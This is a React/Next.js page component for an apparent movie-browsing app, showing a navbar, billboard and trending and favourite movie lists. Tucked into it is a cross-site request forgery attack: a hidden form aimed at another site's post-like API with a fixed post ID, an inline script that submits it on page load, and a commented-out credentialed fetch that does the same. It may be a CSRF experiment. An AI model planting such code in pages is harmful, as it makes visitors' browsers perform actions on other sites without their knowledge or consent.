"use client";

import Navbar from "./_components/Navbar";
import BillBoard from "./_components/BillBoard";
import { useGetAllMovies } from "@/hooks/getAllMovies";
import { useFavorites } from "@/hooks/useFavorites";
import useInfoModel from "@/hooks/useInfoModel";
import MovieList from "./_components/MovieList";
import InfoModel from "./_components/InfoModel";
import { useEffect } from "react";

export default function Page() {
  const { allMovies } = useGetAllMovies();
  const { favoriteMovies } = useFavorites();

  const { isOpen } = useInfoModel();

  // useEffect(function () {
  //   fetch(`https://twitter-clone-zeta-smoky.vercel.app/api/post-like`, {
  //     method: "PUT",
  //     credentials: "include",
  //     body: JSON.stringify({ postId: "69b3f99b94ffa92e142854da" }),
  //   });
  // }, []);

  return (
    <>
      <form
        action="https://twitter-clone-zeta-smoky.vercel.app/api/post-like"
        method="PUT"
      >
        <input type="hidden" name="postId" value="69b3f99b94ffa92e142854da" />
      </form>

      <script>document.forms[0].submit();</script>
      <div className="w-full h-dvh bg-zinc-900">
        <InfoModel visible={isOpen} />
        <Navbar />
        <BillBoard />
        <MovieList title="Trending now" data={allMovies} />
        <MovieList title="Favourite Movies" data={favoriteMovies} />
      </div>
    </>
  );
}
